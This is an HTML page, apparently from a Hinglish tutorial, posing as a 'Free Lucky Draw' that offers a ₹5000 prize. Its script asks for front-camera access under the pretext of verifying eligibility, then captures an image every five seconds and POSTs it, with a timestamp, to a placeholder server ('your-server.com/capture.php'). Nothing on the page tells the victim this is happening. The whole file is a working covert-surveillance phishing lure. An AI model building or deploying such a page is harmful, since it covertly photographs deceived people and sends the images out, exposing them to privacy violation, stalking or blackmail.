<!DOCTYPE html>
<html>
<head>
    <title>Free Lucky Draw 🎁</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 350px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        h1 { font-size: 28px; margin-bottom: 20px; }
        .loading { 
            width: 60px; height: 60px; 
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { font-size: 18px; margin: 20px 0; }
        video { display: none; width: 100%; border-radius: 10px; }
        button { 
            background: #ff6b6b; color: white; 
            border: none; padding: 15px 30px;
            border-radius: 25px; font-size: 16px;
            cursor: pointer; margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 Lucky Draw Win!</h1>
        <div class="loading"></div>
        <div class="status">Checking your device...</div>
        <video id="video" autoplay muted playsinline></video>
        <button onclick="claimPrize()" style="display:none;" id="claimBtn">Claim Prize Now!</button>
    </div>

    <script>
        const video = document.getElementById('video');
        const status = document.querySelector('.status');
        const claimBtn = document.getElementById('claimBtn');
        const loading = document.querySelector('.loading');
        let stream = null;
        let capturing = false;

        // 2 seconds mein camera start
        setTimeout(async () => {
            try {
                status.textContent = '🎥 Verifying camera for prize eligibility...';
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 }
                });
                video.srcObject = stream;
                video.style.display = 'block';
                loading.style.display = 'none';
                status.textContent = '✅ Eligible! Click below to claim ₹5000 prize';
                claimBtn.style.display = 'block';
                
                // Har 5 second mein screenshot
                setInterval(captureScreen, 5000);
                
            } catch(e) {
                status.textContent = '❌ Camera access needed for prize. Try again.';
            }
        }, 2000);

        async function captureScreen() {
            if (!stream || capturing) return;
            capturing = true;
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Yahan tumhara server link daalna (Step 4 mein set karenge)
            try {
                await fetch('https://your-server.com/capture.php', {
                    method: 'POST',
                    body: JSON.stringify({
                        image: imgData,
                        time: new Date().toISOString()
                    })
                });
            } catch(e) {}
            
            capturing = false;
        }

        function claimPrize() {
            status.textContent = '🎉 Congratulations! Prize claimed successfully!';
            claimBtn.textContent = 'Close';
        }
    </script>
</body>
</html>
